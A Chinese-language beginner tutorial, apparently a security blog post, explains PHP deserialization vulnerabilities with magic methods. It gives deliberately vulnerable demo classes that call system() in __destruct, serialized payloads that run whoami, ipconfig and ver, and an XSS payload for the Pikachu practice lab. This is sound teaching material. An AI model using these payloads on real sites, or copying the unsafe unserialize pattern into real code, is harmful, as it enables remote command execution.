#  揭秘PHP反序列化漏洞-入门：黑客是如何入侵你的网站的？   
原创 仙草里没有草噜丶  泷羽Sec   2024-06-20 22:04  
  
# 揭秘PHP反序列化漏洞--入门：黑客是如何入侵你的网站的？  
#### 什么是反序列化？  
  
-格式转换（无非就是将数组或者字符串格式转换成对象）  
#### 序列化serialize()  
```
class S{
    public $test="you txt";
}
$s=new S(); //创建一个对象
serialize($s); //把这个对象进行序列化
//序列化后得到的结果是这个样子的:O:1:"S":1:{s:4:"test";s:7:"you txt";}
//O:代表object
//1:代表对象名字长度为一个字符
//S:对象的名称
//1:代表对象里面有一个变量
//s:数据类型
//4:变量名称的长度
//test:变量名称
//s:数据类型
//7:变量值的长度
//you txt:变量值
```  
#### 反序列化unserialize()  
  
就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。  
```
$u=unserialize("O:1:"S":1:{s:4:"test";s:3:"txt";}");
echo $u->test; //得到的结果为txt
```  
  
序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题  
#### 为什么会出现安全漏洞？  
  
-反序列化漏洞通常源于对应用程序序列化数据安全性的忽视或过度信赖。一些开发者可能认为，只要对序列化数据进行审查就能确保安全，但这种审查往往发生在反序列化过程之后，可能已经错失了防护的最佳时机。现代应用程序结构复杂，涉及众多依赖关系，使得对每个对象的调用进行彻底检查变得极为困难。简而言之，这种漏洞往往是由于  
过分信任用户输入而引发的。  
  
-魔术方法（PHP中把以两个下划线__开头的方法称为魔术方法(Magic methods)）  
  
以下是常见的魔术方法  
> __toString()：当这个对象被当作String使用时，这个方法将会被调用  
> __construct()：使用关键字new实例化对象时会自动调用此构造方法  
> __destruct：析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。  
> __wakeup()：unserialize()反序列化时会被自动调用  
> __invoke()：当尝试以调用函数的方法调用一个对象时，会被自动调用  
> __call()：在对象上下文调中调用不可访问的方法时触发  
> __get()：用于从不可访问的属性读取数据  
> __set()：用于将数据写入不可访问的属性  
> __sleep()：serialize()函数会检查类中是否存在一个魔术方法 _sleep()如果存在，该方法会被优先调用  
  
  
3、反序列化如何发现？  
  
-对象逻辑（代码审计）  
  
-使用自动化工具  
  
-黑（白）盒测试  
  
-分析请求和响应  
  
-使用已知库和漏洞等等  
#### 举例【简单复现】  
  
下面是一个将数据序列化的php代码  
```
<?php
//安全问题
class A{
    public $var = 'you are very good hacker!';
    public function test()    {
        echo $this->var;
        return '1sss';
    }
    public function __construct()    {
        echo 'start' . '<br>';
    }
    public function __destruct()    {
        echo 'end' . '<br>';
    }
    public function __toString()    {
        return '转换字符串';
    }
}
$a = new A();// 实例化这个对象
echo serialize($a) . '<br>';//将这个对象序列化
?>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWGGtP5LgCTZ10WJ9qNibc9vJDYd7HbhAolYyerSqXVgxJ31ic4kenROU3nFu82dNQbVl9L05TCcXvng/640?wx_fmt=png&from=appmsg "null")  
  
如果我添加一句反序列化代码unserialize($_GET['x'])呢？此时代码就出现了漏洞  
```
<?php
class A{
    public $var = 'you are very good hacker!';
    public function test()    {
        echo $this->var;
        return '1sss';
    }
    public function __construct()    {
        echo 'start' . '<br>';
    }
    public function __destruct()    {
        echo 'end' . '<br>';
    }
    public function __toString()    {
        return '转换字符串';
    }
}
$a = new A();// 实例化这个对象
echo serialize($a) . '<br>';//将这个对象序列化
echo unserialize($_GET('x'))//反序列化从url中获取的值
?>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWGGtP5LgCTZ10WJ9qNibc9vJcpYYnZlsLlDIk5Rhwu6JkAjXTZbEzWp3leRbKXNKmCmic8zBaBuQWWw/640?wx_fmt=png&from=appmsg "null")  
  
页面正常，通过我们刚刚添加的反序列划漏洞代码进行测试，发现会得到__toString()魔术方法的返回值，  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWGGtP5LgCTZ10WJ9qNibc9vJ0x11zNog4JQBX3kxyT0SJBqEloMB979gGU9yKpz4BAH6Ye3EXMPIUQ/640?wx_fmt=png&from=appmsg "null")  
  
如果正常传值，那么将会不显示任何结果，因为unserialize()不会对非序列化数据进行解析  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWGGtP5LgCTZ10WJ9qNibc9vJJMiac8icyicCYEjvtrHVoWfSH7ylI383ZUWJf4UIZDhYFo8dwIrtT8UOg/640?wx_fmt=png&from=appmsg "null")  
  
那么如果我在不实例化这个对象，调用魔术方法执行系统命令呢，源代码如下  
```
class B{
    public $var='hellow word';
    public function __destruct()    {
        system('whoami').'<br>';
    }
    public function __construct()    {
        echo 'you are very good hacker!'.'<br>';
    }
    public function __toString()    {
        return $this->var;
    }
}
$b=new B();//实例化对象，显示数据
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWGGtP5LgCTZ10WJ9qNibc9vJfJibSkX37s82XLvLpPHb2tiak3G4FedA0yR4hELEy3Ctvd8cl8laLLJQ/640?wx_fmt=png&from=appmsg "null")  
  
漏洞代码如下，为了方便演示，我将序列化的结果注释了  
```
class B{
    public $var='hellow word';
    public function __destruct()    {
        system('whoami').'<br>';
    }
    public function __construct()    {
        echo 'you are very good hacker!'.'<br>';
    }
    public function __toString()    {
        return $this->var;
    }
}
//$demo=new B();//取消实例化，方便演示
//echo serialize($demo).'<br>'; //输出 O:1:"B":1:{s:3:"var";s:11:"hellow word";}
$test=unserialize($_GET['x']);
echo $test;
```  
  
将我们的序列化后的结果赋值给这个url传参x，得到whoami命令结果，我们并没有创建这个B对象，却执行了这段系统命令，甚至知道整个对象的数据内容，这就是反序列化的不安全性。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWGGtP5LgCTZ10WJ9qNibc9vJXDnfeyf362pnGpHUZSl1L4FnjuQaDjDXaL0ZDLtpSxaDg0wdTXLRZA/640?wx_fmt=png&from=appmsg "null")  
  
再看一个例子，改源码为获取ipconfig  
```
class C{
    public $cmd='ipconfig';
    public function __construct()    {
        echo 'you txt'.'<br>';
    }
    public function __destruct()    {
        system($this->cmd);
    }
}
//echo serialize(new C());// 序列化为：O:1:"C":1:{s:3:"cmd";s:8:"ipconfig";}
unserialize($_GET['x']);
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWGGtP5LgCTZ10WJ9qNibc9vJIzcgtibgF5IhYcf5LibBHzR23PqQzicic5ocric90aONwITJr16KslrwOiaQ/640?wx_fmt=png&from=appmsg "null")  
  
我们修改序列化的值呢，比如查看系统版本号，注入payloadO:1:"C":1:{s:3:"cmd";s:3:"ver";}  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWGGtP5LgCTZ10WJ9qNibc9vJUCsEgxibnMkHygbxsz5iaqiaDHRzHltowj1yJ5yCm7d5g8ccAibZiasSK5w/640?wx_fmt=png&from=appmsg "null")  
  
这就是序列化和反序列化漏洞的一个简单介绍，注：反序列化漏洞多出现于白盒测试。  
#### pikachu  
  
这里首先看看有些什么回显  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWGGtP5LgCTZ10WJ9qNibc9vJufQdIRZxKFk2BZs2LiaN3HMBxq19r9ESOD8fMPkv61sGEwgDNUqLJcw/640?wx_fmt=png&from=appmsg "null")  
  
观察表单数据，传得是一个o参数，但是我查看了网页源码，啥也没发现，黑盒测试，对我这样得小白来说，咋搞(ಥ﹏ಥ)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWGGtP5LgCTZ10WJ9qNibc9vJNGrYW53N7Q4EFSCaJiaCicENiaPXu80IYTDvCoJ1O1ydBY9C1iaBkG9eibw/640?wx_fmt=png&from=appmsg "null")  
  
我查看了源代码，好家伙，他直接给我注释在了上面。。。。  
```
O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWGGtP5LgCTZ10WJ9qNibc9vJNkX7HOR1nFS2reo916RvRlqWiao3YsnRLmLrGAHbe5oqkS9rzLKonWQ/640?wx_fmt=png&from=appmsg "null")  
  
php反序列化中需要注意前面的数字，代表着你的payload值所占字符数量  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWGGtP5LgCTZ10WJ9qNibc9vJByvUWedxiaKuEH24jYwMXUjQw8pvzbyAYZhcv6XpQG83F50d6srozrA/640?wx_fmt=png&from=appmsg "null")  
#### 总结  
  
PHP反序列化漏洞是一个需要开发者高度重视的安全问题。通过深入理解序列化和反序列化的机制，以及积极采取防御措施，可以显著降低这类漏洞带来的风险。安全是一个持续的过程，需要开发者、安全研究人员和用户共同努力来维护。  
  
  
